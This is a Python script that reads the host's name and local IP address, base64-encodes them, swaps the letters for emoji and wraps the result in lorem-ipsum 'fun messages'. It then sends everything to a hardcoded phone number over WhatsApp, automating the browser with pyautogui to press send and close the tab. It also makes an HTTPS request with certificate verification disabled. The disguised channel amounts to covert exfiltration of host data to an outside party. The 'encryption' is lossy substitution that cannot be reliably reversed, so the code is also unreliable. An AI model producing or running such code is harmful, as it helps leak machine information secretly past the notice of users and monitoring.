import pywhatkit as kit
import pyautogui
import time
import random
import base64
from lorem.text import TextLorem
import json
from typing import Dict, Tuple
import socket
import requests





class CustomEncryptor:
    def __init__(self):
        # Define emoji substitution cipher
        self.emoji_cipher = {
            'A': '😎', 'B': '🎉', 'C': '🌟', 'D': '🦄', 'E': '🎨',
            'F': '🎮', 'G': '🎪', 'H': '🎭', 'I': '✨', 'J': '🌈',
            'K': '🚀', 'L': '🎸', 'M': '🎯', 'N': '🎲', 'O': '🎱',
            'P': '🎳', 'Q': '🎰', 'R': '🎲', 'S': '🎮', 'T': '🎪',
            'U': '🎭', 'V': '🎨', 'W': '🎯', 'X': '🎱', 'Y': '🎳',
            'Z': '🎰', '=': '🔒', '/': '🔑', '+': '🔐'
        }
        
        # Initialize Lorem text generator
        self.lorem = TextLorem()
        
    def generate_lorem_key(self) -> str:
        """Generate a random Lorem Ipsum text to use as additional encryption key"""
        return self.lorem.sentence()[:20]  # Limit key length
    
    def encrypt(self, data: str) -> Tuple[str, str, str]:
        """
        Multi-layer encryption:
        1. Convert to base64
        2. Apply emoji substitution cipher
        3. Mix with Lorem Ipsum text
        """
        # Generate encryption key
        lorem_key = self.generate_lorem_key()
        
        # First layer: Base64 encode
        base64_encoded = base64.b64encode(data.encode()).decode()
        
        # Second layer: Emoji substitution
        emoji_encoded = ''
        for char in base64_encoded.upper():
            if char in self.emoji_cipher:
                emoji_encoded += self.emoji_cipher[char]
            else:
                emoji_encoded += char
                
        # Third layer: Mix with Lorem Ipsum
        # Store as JSON for easier separation later
        final_payload = json.dumps({
            "encrypted_data": emoji_encoded,
            "key": lorem_key
        })
        
        return base64_encoded, emoji_encoded, final_payload

def get_random_lorem():
    """Generate a random Lorem Ipsum sentence"""
    lorem = TextLorem(srange=(1,2))
    return lorem.sentence()

def get_random_meme():
    """Return a random fun emoji"""
    fun_emojis = ["😎", "🎉", "🌟", "🦄", "🎨", "🎮", "🎪", "🎭", "🎪", "✨"]
    return random.choice(fun_emojis)

def send_encrypted_message(phone_number: str, secret_data: str):
    """Send both fun messages and encrypted data"""
    # Initialize encryptor
    encryptor = CustomEncryptor()
    
    # Generate regular fun message
    fun_message = f"{get_random_lorem()}\n{get_random_meme()}"
    
    # Encrypt the secret data
    base64_encoded, emoji_encoded, final_payload = encryptor.encrypt(secret_data)
    
    # Combine messages with clear separation
    full_message = (
        f"Fun Message:\n{fun_message}\n\n"
        f"Fun Message:\n{emoji_encoded}\n\n"
        f"Encrypted Message:\n{final_payload}"
    )
    
    print("Sending message with following components:")
    print(f"Original data: {secret_data}")
    print(f"Base64 encoded: {base64_encoded}")
    print(f"Emoji encoded: {emoji_encoded}")
    print(f"Final payload: {final_payload}")
    
    try:
        # Send message using pywhatkit
        kit.sendwhatmsg_instantly(phone_number, full_message)
        
        # Press Enter to send
        time.sleep(2)
        pyautogui.press("enter")
        
        # Wait briefly to ensure message is sent
        time.sleep(2)
        
        # Close the browser tab
        pyautogui.hotkey("ctrl", "w")
        
        print("Message sent successfully!")
        
    except Exception as e:
        print(f"An error occurred: {str(e)}")

# Example usage
if __name__ == "__main__":
    requests.get("https://google.com", verify=False)
    hostname = socket.gethostname()
    ip_address = socket.gethostbyname(hostname)

    print(f"My local IPv4 address is: {ip_address}")
    phone_number = "+27715848289"
    # phone_number = "+27740692979"
    secret_data = ip_address
    send_encrypted_message(phone_number, secret_data)